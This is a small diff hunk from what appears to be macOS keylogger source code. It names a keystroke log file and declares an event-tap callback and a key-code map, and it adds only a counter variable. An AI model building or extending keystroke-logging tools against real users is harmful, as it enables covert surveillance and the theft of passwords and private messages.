@@ -14,6 +14,7 @@ const char *logfileLocation = "/var/log/keystroke.log";
 CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
 const char *convertKeyCode(int, bool);
 
+unsigned long logCounter;
 
 
 const char *keyCodeMap[127][2] = {
